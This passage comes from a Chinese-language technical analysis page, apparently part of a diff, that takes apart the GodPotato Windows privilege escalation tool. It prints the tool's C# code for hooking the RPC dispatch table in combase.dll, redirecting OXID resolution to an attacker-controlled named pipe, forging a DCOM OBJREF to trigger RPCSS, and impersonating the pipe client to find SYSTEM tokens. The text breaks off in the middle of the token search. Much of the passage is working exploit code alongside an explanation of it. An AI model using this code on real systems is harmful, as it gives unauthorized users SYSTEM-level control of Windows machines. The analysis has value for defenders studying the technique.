+<p><strong>Hook实现</strong>: <a href="GodPotato/NativeAPI/GodPotatoContext.cs:281-287"><code>NativeAPI/GodPotatoContext.cs</code></a></p>
+<div class="highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-1-1">1</a></span>
+<span class="normal"><a href="#__codelineno-1-2">2</a></span>
+<span class="normal"><a href="#__codelineno-1-3">3</a></span>
+<span class="normal"><a href="#__codelineno-1-4">4</a></span>
+<span class="normal"><a href="#__codelineno-1-5">5</a></span>
+<span class="normal"><a href="#__codelineno-1-6">6</a></span>
+<span class="normal"><a href="#__codelineno-1-7">7</a></span></pre></div></td><td class="code"><div><pre><span></span><code><a id="__codelineno-1-1" name="__codelineno-1-1"></a><span class="k">public</span><span class="w"> </span><span class="k">void</span><span class="w"> </span><span class="nf">HookRPC</span><span class="p">()</span>
+<a id="__codelineno-1-2" name="__codelineno-1-2"></a><span class="p">{</span>
+<a id="__codelineno-1-3" name="__codelineno-1-3"></a><span class="w">    </span><span class="kt">uint</span><span class="w"> </span><span class="n">old</span><span class="p">;</span>
+<a id="__codelineno-1-4" name="__codelineno-1-4"></a><span class="w">    </span><span class="n">VirtualProtect</span><span class="p">(</span><span class="n">DispatchTablePtr</span><span class="p">,</span><span class="w"> </span><span class="p">(</span><span class="kt">uint</span><span class="p">)(</span><span class="n">IntPtr</span><span class="p">.</span><span class="n">Size</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="n">dispatchTable</span><span class="p">.</span><span class="n">Length</span><span class="p">),</span><span class="w"> </span><span class="mh">0x04</span><span class="p">,</span><span class="w"> </span><span class="k">out</span><span class="w"> </span><span class="n">old</span><span class="p">);</span>
+<a id="__codelineno-1-5" name="__codelineno-1-5"></a><span class="w">    </span><span class="n">Marshal</span><span class="p">.</span><span class="n">WriteIntPtr</span><span class="p">(</span><span class="n">DispatchTablePtr</span><span class="p">,</span><span class="w"> </span><span class="n">Marshal</span><span class="p">.</span><span class="n">GetFunctionPointerForDelegate</span><span class="p">(</span><span class="n">useProtseqDelegate</span><span class="p">));</span>
+<a id="__codelineno-1-6" name="__codelineno-1-6"></a><span class="w">    </span><span class="n">IsHook</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">true</span><span class="p">;</span>
+<a id="__codelineno-1-7" name="__codelineno-1-7"></a><span class="p">}</span>
+</code></pre></div></td></tr></table></div>
+<p><strong>技术细节</strong>:
+1. 搜索combase.dll中的特定RPC接口GUID: <code>18f70770-8e64-11cf-9af1-0020af6e72f4</code> (IObjectExporter/OXID解析器接口)
+2. 解析RPC_SERVER_INTERFACE结构获取分发表
+3. 使用<code>VirtualProtect</code>修改内存保护属性为可写(0x04 = PAGE_READWRITE)
+4. 将分发表第一个函数指针替换为自定义函数</p>
+<p><strong>微软官方文档说明</strong>:
+根据<a href="https://learn.microsoft.com/windows/win32/midl/com-dcom-and-type-libraries">COM, DCOM, and Type Libraries文档</a>:
+- DCOM使用RPC实现分布式组件对象通信
+- COM接口定义了对象的身份和外部特征
+- 客户端通过接口获取对象的方法和数据访问权限</p>
+<hr />
+<h3 id="2-rpc">功能2: 自定义RPC端点解析</h3>
+<h4 id="_5">功能目的</h4>
+<p>当Hook生效后，控制RPC端点解析过程，将DCOM连接请求重定向到攻击者创建的命名管道，而非原始目标。</p>
+<h4 id="_6">实现方式</h4>
+<p><strong>代码位置</strong>: <a href="GodPotato/NativeAPI/GodPotatoContext.cs:341-380"><code>NativeAPI/GodPotatoContext.cs</code></a> (NewOrcbRPC类)</p>
+<div class="highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-2-1"> 1</a></span>
+<span class="normal"><a href="#__codelineno-2-2"> 2</a></span>
+<span class="normal"><a href="#__codelineno-2-3"> 3</a></span>
+<span class="normal"><a href="#__codelineno-2-4"> 4</a></span>
+<span class="normal"><a href="#__codelineno-2-5"> 5</a></span>
+<span class="normal"><a href="#__codelineno-2-6"> 6</a></span>
+<span class="normal"><a href="#__codelineno-2-7"> 7</a></span>
+<span class="normal"><a href="#__codelineno-2-8"> 8</a></span>
+<span class="normal"><a href="#__codelineno-2-9"> 9</a></span>
+<span class="normal"><a href="#__codelineno-2-10">10</a></span>
+<span class="normal"><a href="#__codelineno-2-11">11</a></span>
+<span class="normal"><a href="#__codelineno-2-12">12</a></span>
+<span class="normal"><a href="#__codelineno-2-13">13</a></span>
+<span class="normal"><a href="#__codelineno-2-14">14</a></span>
+<span class="normal"><a href="#__codelineno-2-15">15</a></span>
+<span class="normal"><a href="#__codelineno-2-16">16</a></span>
+<span class="normal"><a href="#__codelineno-2-17">17</a></span>
+<span class="normal"><a href="#__codelineno-2-18">18</a></span>
+<span class="normal"><a href="#__codelineno-2-19">19</a></span>
+<span class="normal"><a href="#__codelineno-2-20">20</a></span></pre></div></td><td class="code"><div><pre><span></span><code><a id="__codelineno-2-1" name="__codelineno-2-1"></a><span class="k">public</span><span class="w"> </span><span class="kt">int</span><span class="w"> </span><span class="nf">fun</span><span class="p">(</span><span class="n">IntPtr</span><span class="w"> </span><span class="n">ppdsaNewBindings</span><span class="p">,</span><span class="w"> </span><span class="n">IntPtr</span><span class="w"> </span><span class="n">ppdsaNewSecurity</span><span class="p">)</span>
+<a id="__codelineno-2-2" name="__codelineno-2-2"></a><span class="p">{</span>
+<a id="__codelineno-2-3" name="__codelineno-2-3"></a><span class="w">    </span><span class="kt">string</span><span class="p">[]</span><span class="w"> </span><span class="n">endpoints</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">{</span><span class="w"> </span><span class="n">godPotatoContext</span><span class="p">.</span><span class="n">clientPipe</span><span class="p">,</span><span class="w"> </span><span class="s">&quot;ncacn_ip_tcp:fuck you !&quot;</span><span class="w"> </span><span class="p">};</span>
+<a id="__codelineno-2-4" name="__codelineno-2-4"></a>
+<a id="__codelineno-2-5" name="__codelineno-2-5"></a><span class="w">    </span><span class="c1">// 构造DualStringArray结构</span>
+<a id="__codelineno-2-6" name="__codelineno-2-6"></a><span class="w">    </span><span class="kt">int</span><span class="w"> </span><span class="n">entrieSize</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">3</span><span class="p">;</span>
+<a id="__codelineno-2-7" name="__codelineno-2-7"></a><span class="w">    </span><span class="k">for</span><span class="w"> </span><span class="p">(</span><span class="kt">int</span><span class="w"> </span><span class="n">i</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">0</span><span class="p">;</span><span class="w"> </span><span class="n">i</span><span class="w"> </span><span class="o">&lt;</span><span class="w"> </span><span class="n">endpoints</span><span class="p">.</span><span class="n">Length</span><span class="p">;</span><span class="w"> </span><span class="n">i</span><span class="o">++</span><span class="p">)</span>
+<a id="__codelineno-2-8" name="__codelineno-2-8"></a><span class="w">    </span><span class="p">{</span>
+<a id="__codelineno-2-9" name="__codelineno-2-9"></a><span class="w">        </span><span class="n">entrieSize</span><span class="w"> </span><span class="o">+=</span><span class="w"> </span><span class="n">endpoints</span><span class="p">[</span><span class="n">i</span><span class="p">].</span><span class="n">Length</span><span class="p">;</span>
+<a id="__codelineno-2-10" name="__codelineno-2-10"></a><span class="w">        </span><span class="n">entrieSize</span><span class="o">++</span><span class="p">;</span>
+<a id="__codelineno-2-11" name="__codelineno-2-11"></a><span class="w">    </span><span class="p">}</span>
+<a id="__codelineno-2-12" name="__codelineno-2-12"></a>
+<a id="__codelineno-2-13" name="__codelineno-2-13"></a><span class="w">    </span><span class="c1">// 写入自定义端点绑定信息</span>
+<a id="__codelineno-2-14" name="__codelineno-2-14"></a><span class="w">    </span><span class="n">IntPtr</span><span class="w"> </span><span class="n">pdsaNewBindings</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">Marshal</span><span class="p">.</span><span class="n">AllocHGlobal</span><span class="p">(</span><span class="n">memroySize</span><span class="p">);</span>
+<a id="__codelineno-2-15" name="__codelineno-2-15"></a><span class="w">    </span><span class="n">Marshal</span><span class="p">.</span><span class="n">WriteInt16</span><span class="p">(</span><span class="n">pdsaNewBindings</span><span class="p">,</span><span class="w"> </span><span class="n">offset</span><span class="p">,</span><span class="w"> </span><span class="p">(</span><span class="kt">short</span><span class="p">)</span><span class="n">entrieSize</span><span class="p">);</span>
+<a id="__codelineno-2-16" name="__codelineno-2-16"></a><span class="w">    </span><span class="c1">// ... 写入端点字符串</span>
+<a id="__codelineno-2-17" name="__codelineno-2-17"></a>
+<a id="__codelineno-2-18" name="__codelineno-2-18"></a><span class="w">    </span><span class="n">Marshal</span><span class="p">.</span><span class="n">WriteIntPtr</span><span class="p">(</span><span class="n">ppdsaNewBindings</span><span class="p">,</span><span class="w"> </span><span class="n">pdsaNewBindings</span><span class="p">);</span>
+<a id="__codelineno-2-19" name="__codelineno-2-19"></a><span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="mi">0</span><span class="p">;</span>
+<a id="__codelineno-2-20" name="__codelineno-2-20"></a><span class="p">}</span>
+</code></pre></div></td></tr></table></div>
+<p><strong>技术细节</strong>:
+1. 函数接收两个参数: <code>ppdsaNewBindings</code>(新绑定信息)和<code>ppdsaNewSecurity</code>(安全绑定)
+2. 构造包含攻击者命名管道路径的DualStringArray
+3. 端点格式: <code>ncacn_np:localhost/pipe/GodPotato[\pipe\epmapper]</code>
+4. 返回0表示成功，RPC运行时将使用新的绑定信息</p>
+<p><strong>微软官方文档说明</strong>:
+根据<a href="https://learn.microsoft.com/windows/win32/midl/com-dcom-and-type-libraries">COM/DCOM类型库文档</a>:
+- COM和DCOM使用RPC实现分布式组件对象通信
+- DCOM协议透明地提供可靠、安全、高效的COM组件间通信
+- OXID(Object Exporter ID)是对象导出器的唯一标识符，用于定位DCOM对象所在进程
+- 客户端解组OBJREF时会触发OXID解析过程，连接OXID解析器获取绑定信息</p>
+<p>根据<a href="https://learn.microsoft.com/windows/win32/com/dcom-security-enhancements-in-windows-xp-service-pack-2-and-windows-server-2003-service-pack-1">DCOM安全增强文档</a>:
+- RPCSS服务(rpcss.exe)是DCOM Service Control Manager，负责管理DCOM对象激活
+- RPCSS服务负责OXID解析，将对象导出器标识符转换为可用的RPC绑定信息</p>
+<hr />
+<h3 id="3-objrefdcom">功能3: OBJREF构造与DCOM触发</h3>
+<h4 id="_7">功能目的</h4>
+<p>构造恶意DCOM对象引用(OBJREF)，触发RPCSS服务进行OXID解析，诱导其连接到攻击者的命名管道。</p>
+<h4 id="_8">实现方式</h4>
+<p><strong>代码位置</strong>: <a href="GodPotato/NativeAPI/GodPotatoUnmarshalTrigger.cs:38-65"><code>NativeAPI/GodPotatoUnmarshalTrigger.cs</code></a></p>
+<div class="highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-3-1"> 1</a></span>
+<span class="normal"><a href="#__codelineno-3-2"> 2</a></span>
+<span class="normal"><a href="#__codelineno-3-3"> 3</a></span>
+<span class="normal"><a href="#__codelineno-3-4"> 4</a></span>
+<span class="normal"><a href="#__codelineno-3-5"> 5</a></span>
+<span class="normal"><a href="#__codelineno-3-6"> 6</a></span>
+<span class="normal"><a href="#__codelineno-3-7"> 7</a></span>
+<span class="normal"><a href="#__codelineno-3-8"> 8</a></span>
+<span class="normal"><a href="#__codelineno-3-9"> 9</a></span>
+<span class="normal"><a href="#__codelineno-3-10">10</a></span>
+<span class="normal"><a href="#__codelineno-3-11">11</a></span>
+<span class="normal"><a href="#__codelineno-3-12">12</a></span>
+<span class="normal"><a href="#__codelineno-3-13">13</a></span>
+<span class="normal"><a href="#__codelineno-3-14">14</a></span>
+<span class="normal"><a href="#__codelineno-3-15">15</a></span>
+<span class="normal"><a href="#__codelineno-3-16">16</a></span>
+<span class="normal"><a href="#__codelineno-3-17">17</a></span></pre></div></td><td class="code"><div><pre><span></span><code><a id="__codelineno-3-1" name="__codelineno-3-1"></a><span class="k">public</span><span class="w"> </span><span class="kt">int</span><span class="w"> </span><span class="nf">Trigger</span><span class="p">()</span><span class="w"> </span><span class="p">{</span>
+<a id="__codelineno-3-2" name="__codelineno-3-2"></a><span class="w">    </span><span class="c1">// 获取原始OBJREF</span>
+<a id="__codelineno-3-3" name="__codelineno-3-3"></a><span class="w">    </span><span class="n">moniker</span><span class="p">.</span><span class="n">GetDisplayName</span><span class="p">(</span><span class="n">bindCtx</span><span class="p">,</span><span class="w"> </span><span class="k">null</span><span class="p">,</span><span class="w"> </span><span class="k">out</span><span class="w"> </span><span class="n">ppszDisplayName</span><span class="p">);</span>
+<a id="__codelineno-3-4" name="__codelineno-3-4"></a><span class="w">    </span><span class="kt">byte</span><span class="p">[]</span><span class="w"> </span><span class="n">objrefBytes</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">Convert</span><span class="p">.</span><span class="n">FromBase64String</span><span class="p">(</span><span class="n">ppszDisplayName</span><span class="p">.</span><span class="n">Replace</span><span class="p">(</span><span class="s">&quot;objref:&quot;</span><span class="p">,</span><span class="w"> </span><span class="s">&quot;&quot;</span><span class="p">).</span><span class="n">Replace</span><span class="p">(</span><span class="s">&quot;:&quot;</span><span class="p">,</span><span class="w"> </span><span class="s">&quot;&quot;</span><span class="p">));</span>
+<a id="__codelineno-3-5" name="__codelineno-3-5"></a><span class="w">    </span><span class="n">ObjRef</span><span class="w"> </span><span class="n">tmpObjRef</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">ObjRef</span><span class="p">(</span><span class="n">objrefBytes</span><span class="p">);</span>
+<a id="__codelineno-3-6" name="__codelineno-3-6"></a>
+<a id="__codelineno-3-7" name="__codelineno-3-7"></a><span class="w">    </span><span class="c1">// 构造恶意OBJREF</span>
+<a id="__codelineno-3-8" name="__codelineno-3-8"></a><span class="w">    </span><span class="n">ObjRef</span><span class="w"> </span><span class="n">objRef</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">ObjRef</span><span class="p">(</span><span class="n">IID_IUnknown</span><span class="p">,</span>
+<a id="__codelineno-3-9" name="__codelineno-3-9"></a><span class="w">        </span><span class="k">new</span><span class="w"> </span><span class="n">ObjRef</span><span class="p">.</span><span class="n">Standard</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="w"> </span><span class="mi">1</span><span class="p">,</span><span class="w"> </span><span class="n">tmpObjRef</span><span class="p">.</span><span class="n">StandardObjRef</span><span class="p">.</span><span class="n">OXID</span><span class="p">,</span><span class="w"> </span>
+<a id="__codelineno-3-10" name="__codelineno-3-10"></a><span class="w">            </span><span class="n">tmpObjRef</span><span class="p">.</span><span class="n">StandardObjRef</span><span class="p">.</span><span class="n">OID</span><span class="p">,</span><span class="w"> </span><span class="n">tmpObjRef</span><span class="p">.</span><span class="n">StandardObjReflected</span><span class="p">.</span><span class="n">IPID</span><span class="p">,</span>
+<a id="__codelineno-3-11" name="__codelineno-3-11"></a><span class="w">            </span><span class="k">new</span><span class="w"> </span><span class="n">ObjRef</span><span class="p">.</span><span class="n">DualStringArray</span><span class="p">(</span>
+<a id="__codelineno-3-12" name="__codelineno-3-12"></a><span class="w">                </span><span class="k">new</span><span class="w"> </span><span class="n">ObjRef</span><span class="p">.</span><span class="n">StringBinding</span><span class="p">(</span><span class="n">TowerProtocol</span><span class="p">.</span><span class="n">EPM_PROTOCOL_TCP</span><span class="p">,</span><span class="w"> </span><span class="s">&quot;127.0.0.1&quot;</span><span class="p">),</span>
+<a id="__codelineno-3-13" name="__codelineno-3-13"></a><span class="w">                </span><span class="k">new</span><span class="w"> </span><span class="n">ObjRef</span><span class="p">.</span><span class="n">SecurityBinding</span><span class="p">(</span><span class="mh">0xa</span><span class="p">,</span><span class="w"> </span><span class="mh">0xffff</span><span class="p">,</span><span class="w"> </span><span class="k">null</span><span class="p">))));</span>
+<a id="__codelineno-3-14" name="__codelineno-3-14"></a>
+<a id="__codelineno-3-15" name="__codelineno-3-15"></a><span class="w">    </span><span class="c1">// 解组对象，触发OXID解析</span>
+<a id="__codelineno-3-16" name="__codelineno-3-16"></a><span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="n">UnmarshalDCOM</span><span class="p">.</span><span class="n">UnmarshalObject</span><span class="p">(</span><span class="n">data</span><span class="p">,</span><span class="w"> </span><span class="k">out</span><span class="w"> </span><span class="n">ppv</span><span class="p">);</span>
+<a id="__codelineno-3-17" name="__codelineno-3-17"></a><span class="p">}</span>
+</code></pre></div></td></tr></table></div>
+<p><strong>OBJREF结构</strong>: <a href="GodPotato/NativeAPI/ObjRef.cs:36-233"><code>NativeAPI/ObjRef.cs</code></a></p>
+<div class="highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-4-1"> 1</a></span>
+<span class="normal"><a href="#__codelineno-4-2"> 2</a></span>
+<span class="normal"><a href="#__codelineno-4-3"> 3</a></span>
+<span class="normal"><a href="#__codelineno-4-4"> 4</a></span>
+<span class="normal"><a href="#__codelineno-4-5"> 5</a></span>
+<span class="normal"><a href="#__codelineno-4-6"> 6</a></span>
+<span class="normal"><a href="#__codelineno-4-7"> 7</a></span>
+<span class="normal"><a href="#__codelineno-4-8"> 8</a></span>
+<span class="normal"><a href="#__codelineno-4-9"> 9</a></span>
+<span class="normal"><a href="#__codelineno-4-10">10</a></span>
+<span class="normal"><a href="#__codelineno-4-11">11</a></span>
+<span class="normal"><a href="#__codelineno-4-12">12</a></span>
+<span class="normal"><a href="#__codelineno-4-13">13</a></span></pre></div></td><td class="code"><div><pre><span></span><code><a id="__codelineno-4-1" name="__codelineno-4-1"></a><span class="k">internal</span><span class="w"> </span><span class="k">class</span><span class="w"> </span><span class="nc">ObjRef</span><span class="w"> </span><span class="p">{</span>
+<a id="__codelineno-4-2" name="__codelineno-4-2"></a><span class="w">    </span><span class="k">const</span><span class="w"> </span><span class="kt">uint</span><span class="w"> </span><span class="n">Signature</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mh">0x574f454d</span><span class="p">;</span><span class="w">  </span><span class="c1">// &quot;MEOW&quot;</span>
+<a id="__codelineno-4-3" name="__codelineno-4-3"></a>
+<a id="__codelineno-4-4" name="__codelineno-4-4"></a><span class="w">    </span><span class="k">internal</span><span class="w"> </span><span class="k">class</span><span class="w"> </span><span class="nc">Standard</span><span class="w"> </span><span class="p">{</span>
+<a id="__codelineno-4-5" name="__codelineno-4-5"></a><span class="w">        </span><span class="k">const</span><span class="w"> </span><span class="kt">ulong</span><span class="w"> </span><span class="n">Oxid</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mh">0x0703d84a06ec96cc</span><span class="p">;</span>
+<a id="__codelineno-4-6" name="__codelineno-4-6"></a><span class="w">        </span><span class="k">const</span><span class="w"> </span><span class="kt">ulong</span><span class="w"> </span><span class="n">Oid</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mh">0x539d029cce31ac</span><span class="p">;</span>
+<a id="__codelineno-4-7" name="__codelineno-4-7"></a>
+<a id="__codelineno-4-8" name="__codelineno-4-8"></a><span class="w">        </span><span class="k">public</span><span class="w"> </span><span class="k">readonly</span><span class="w"> </span><span class="kt">ulong</span><span class="w"> </span><span class="n">OXID</span><span class="p">;</span><span class="w">  </span><span class="c1">// 对象导出器标识符</span>
+<a id="__codelineno-4-9" name="__codelineno-4-9"></a><span class="w">        </span><span class="k">public</span><span class="w"> </span><span class="k">readonly</span><span class="w"> </span><span class="kt">ulong</span><span class="w"> </span><span class="n">OID</span><span class="p">;</span><span class="w">   </span><span class="c1">// 对象标识符</span>
+<a id="__codelineno-4-10" name="__codelineno-4-10"></a><span class="w">        </span><span class="k">public</span><span class="w"> </span><span class="k">readonly</span><span class="w"> </span><span class="n">Guid</span><span class="w"> </span><span class="n">IPID</span><span class="p">;</span><span class="w">   </span><span class="c1">// 接口指针标识符</span>
+<a id="__codelineno-4-11" name="__codelineno-4-11"></a><span class="w">        </span><span class="k">public</span><span class="w"> </span><span class="k">readonly</span><span class="w"> </span><span class="n">DualStringArray</span><span class="w"> </span><span class="n">DualStringArray</span><span class="p">;</span><span class="w">  </span><span class="c1">// 绑定信息</span>
+<a id="__codelineno-4-12" name="__codelineno-4-12"></a><span class="w">    </span><span class="p">}</span>
+<a id="__codelineno-4-13" name="__codelineno-4-13"></a><span class="p">}</span>
+</code></pre></div></td></tr></table></div>
+<p><strong>技术细节</strong>:
+1. OBJREF签名: <code>0x574f454d</code> ("MEOW")
+2. 使用<code>CreateObjrefMoniker</code>获取当前进程的OBJREF模板
+3. 修改DualStringArray中的StringBinding，指向攻击者的端点
+4. 调用<code>CoUnmarshalInterface</code>触发OXID解析过程</p>
+<p><strong>微软官方文档说明</strong>:
+根据<a href="https://learn.microsoft.com/windows/win32/api/combaseapi/nf-combaseapi-counmarshalinterface">CoUnmarshalInterface函数文档</a>:
+- 该函数使用之前写入流的数据初始化新创建的代理
+- 从流中读取用于创建代理实例的CLSID
+- 获取IMarshal指针进行解组操作
+- 安全警告: 使用不可信数据调用此方法是安全风险</p>
+<hr />
+<h3 id="4">功能4: 命名管道服务器</h3>
+<h4 id="_9">功能目的</h4>
+<p>创建命名管道服务器，等待RPCSS服务连接，然后进行令牌模拟获取SYSTEM权限。</p>
+<h4 id="_10">实现方式</h4>
+<p><strong>代码位置</strong>: <a href="GodPotato/NativeAPI/GodPotatoContext.cs:177-264"><code>NativeAPI/GodPotatoContext.cs</code></a></p>
+<div class="highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-5-1"> 1</a></span>
+<span class="normal"><a href="#__codelineno-5-2"> 2</a></span>
+<span class="normal"><a href="#__codelineno-5-3"> 3</a></span>
+<span class="normal"><a href="#__codelineno-5-4"> 4</a></span>
+<span class="normal"><a href="#__codelineno-5-5"> 5</a></span>
+<span class="normal"><a href="#__codelineno-5-6"> 6</a></span>
+<span class="normal"><a href="#__codelineno-5-7"> 7</a></span>
+<span class="normal"><a href="#__codelineno-5-8"> 8</a></span>
+<span class="normal"><a href="#__codelineno-5-9"> 9</a></span>
+<span class="normal"><a href="#__codelineno-5-10">10</a></span>
+<span class="normal"><a href="#__codelineno-5-11">11</a></span>
+<span class="normal"><a href="#__codelineno-5-12">12</a></span>
+<span class="normal"><a href="#__codelineno-5-13">13</a></span>
+<span class="normal"><a href="#__codelineno-5-14">14</a></span>
+<span class="normal"><a href="#__codelineno-5-15">15</a></span>
+<span class="normal"><a href="#__codelineno-5-16">16</a></span>
+<span class="normal"><a href="#__codelineno-5-17">17</a></span>
+<span class="normal"><a href="#__codelineno-5-18">18</a></span>
+<span class="normal"><a href="#__codelineno-5-19">19</a></span>
+<span class="normal"><a href="#__codelineno-5-20">20</a></span>
+<span class="normal"><a href="#__codelineno-5-21">21</a></span>
+<span class="normal"><a href="#__codelineno-5-22">22</a></span>
+<span class="normal"><a href="#__codelineno-5-23">23</a></span>
+<span class="normal"><a href="#__codelineno-5-24">24</a></span>
+<span class="normal"><a href="#__codelineno-5-25">25</a></span>
+<span class="normal"><a href="#__codelineno-5-26">26</a></span>
+<span class="normal"><a href="#__codelineno-5-27">27</a></span>
+<span class="normal"><a href="#__codelineno-5-28">28</a></span>
+<span class="normal"><a href="#__codelineno-5-29">29</a></span>
+<span class="normal"><a href="#__codelineno-5-30">30</a></span>
+<span class="normal"><a href="#__codelineno-5-31">31</a></span>
+<span class="normal"><a href="#__codelineno-5-32">32</a></span></pre></div></td><td class="code"><div><pre><span></span><code><a id="__codelineno-5-1" name="__codelineno-5-1"></a><span class="k">protected</span><span class="w"> </span><span class="k">void</span><span class="w"> </span><span class="nf">PipeServer</span><span class="p">()</span>
+<a id="__codelineno-5-2" name="__codelineno-5-2"></a><span class="p">{</span>
+<a id="__codelineno-5-3" name="__codelineno-5-3"></a><span class="w">    </span><span class="c1">// 创建安全描述符允许所有人访问</span>
+<a id="__codelineno-5-4" name="__codelineno-5-4"></a><span class="w">    </span><span class="n">ConvertStringSecurityDescriptorToSecurityDescriptor</span><span class="p">(</span><span class="s">&quot;D:(A;OICI;GA;;;WD)&quot;</span><span class="p">,</span><span class="w"> </span><span class="mi">1</span><span class="p">,</span><span class="w"> </span><span class="k">out</span><span class="w"> </span><span class="n">securityDescriptor</span><span class="p">,</span><span class="w"> </span><span class="k">out</span><span class="w"> </span><span class="n">securityDescriptorSize</span><span class="p">);</span>
+<a id="__codelineno-5-5" name="__codelineno-5-5"></a>
+<a id="__codelineno-5-6" name="__codelineno-5-6"></a><span class="w">    </span><span class="c1">// 创建命名管道</span>
+<a id="__codelineno-5-7" name="__codelineno-5-7"></a><span class="w">    </span><span class="n">pipeServerHandle</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">CreateNamedPipe</span><span class="p">(</span><span class="n">serverPipe</span><span class="p">,</span><span class="w"> </span><span class="n">PIPE_ACCESS_DUPLEX</span><span class="p">,</span><span class="w"> </span>
+<a id="__codelineno-5-8" name="__codelineno-5-8"></a><span class="w">        </span><span class="n">PIPE_TYPE_BYTE</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">PIPE_READMODE_BYTE</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">PIPE_WAIT</span><span class="p">,</span><span class="w"> </span>
+<a id="__codelineno-5-9" name="__codelineno-5-9"></a><span class="w">        </span><span class="n">PIPE_UNLIMITED_INSTANCES</span><span class="p">,</span><span class="w"> </span><span class="mi">521</span><span class="p">,</span><span class="w"> </span><span class="mi">0</span><span class="p">,</span><span class="w"> </span><span class="mi">123</span><span class="p">,</span><span class="w"> </span><span class="k">ref</span><span class="w"> </span><span class="n">securityAttributes</span><span class="p">);</span>
+<a id="__codelineno-5-10" name="__codelineno-5-10"></a>
+<a id="__codelineno-5-11" name="__codelineno-5-11"></a><span class="w">    </span><span class="c1">// 等待连接</span>
+<a id="__codelineno-5-12" name="__codelineno-5-12"></a><span class="w">    </span><span class="n">ConnectNamedPipe</span><span class="p">(</span><span class="n">pipeServerHandle</span><span class="p">,</span><span class="w"> </span><span class="n">IntPtr</span><span class="p">.</span><span class="n">Zero</span><span class="p">);</span>
+<a id="__codelineno-5-13" name="__codelineno-5-13"></a>
+<a id="__codelineno-5-14" name="__codelineno-5-14"></a><span class="w">    </span><span class="c1">// 模拟客户端</span>
+<a id="__codelineno-5-15" name="__codelineno-5-15"></a><span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">ImpersonateNamedPipeClient</span><span class="p">(</span><span class="n">pipeServerHandle</span><span class="p">))</span>
+<a id="__codelineno-5-16" name="__codelineno-5-16"></a><span class="w">    </span><span class="p">{</span>
+<a id="__codelineno-5-17" name="__codelineno-5-17"></a><span class="w">        </span><span class="n">systemIdentity</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">WindowsIdentity</span><span class="p">.</span><span class="n">GetCurrent</span><span class="p">();</span>
+<a id="__codelineno-5-18" name="__codelineno-5-18"></a>
+<a id="__codelineno-5-19" name="__codelineno-5-19"></a><span class="w">        </span><span class="c1">// 搜索SYSTEM令牌</span>
+<a id="__codelineno-5-20" name="__codelineno-5-20"></a><span class="w">        </span><span class="n">SharpToken</span><span class="p">.</span><span class="n">TokenuUils</span><span class="p">.</span><span class="n">ListProcessTokens</span><span class="p">(</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="w"> </span><span class="n">processToken</span><span class="w"> </span><span class="o">=&gt;</span><span class="w"> </span><span class="p">{</span>
+<a id="__codelineno-5-21" name="__codelineno-5-21"></a><span class="w">            </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">processToken</span><span class="p">.</span><span class="n">SID</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="s">&quot;S-1-5-18&quot;</span><span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span>
+<a id="__codelineno-5-22" name="__codelineno-5-22"></a><span class="w">                </span><span class="n">processToken</span><span class="p">.</span><span class="n">ImpersonationLevel</span><span class="w"> </span><span class="o">&gt;=</span><span class="w"> </span><span class="n">TokenImpersonationLevel</span><span class="p">.</span><span class="n">Impersonation</span><span class="w"> </span><span class="o">&amp;&amp;</span>
+<a id="__codelineno-5-23" name="__codelineno-5-23"></a><span class="w">                </span><span class="n">processToken</span><span class="p">.</span><span class="n">IntegrityLevel</span><span class="w"> </span><span class="o">&gt;=</span><span class="w"> </span><span class="n">SharpToken</span><span class="p">.</span><span class="n">IntegrityLevel</span><span class="p">.</span><span class="n">SystemIntegrity</span><span class="p">)</span>
+<a id="__codelineno-5-24" name="__codelineno-5-24"></a><span class="w">            </span><span class="p">{</span>
+<a id="__codelineno-5-25" name="__codelineno-5-25"></a><span class="w">                </span><span class="n">systemIdentity</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">WindowsIdentity</span><span class="p">(</span><span class="n">processToken</span><span class="p">.</span><span class="n">TokenHandle</span><span class="p">);</span>
+<a id="__codelineno-5-26" name="__codelineno-5-26"></a><span class="w">                </span><span class="n">isFindSystemToken</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">true</span><span class="p">;</span>
+<a id="__codelineno-5-27" name="__codelineno-5-27"></a><span class="w">                </span><span class="k">return</span><span class="w"> </span><span class="k">false</span><span class="p">;</span>
+<a id="__codelineno-5-28" name="__codelineno-5-28"></a><span class="w">            </span><span class="p">}</span>
+<a id="__codelineno-5-29" name="__codelineno-5-29"></a><span class="w">            </span><span class="k">return</span><span class="w"> </span><span class="k">true</span><span class="p">;</span>
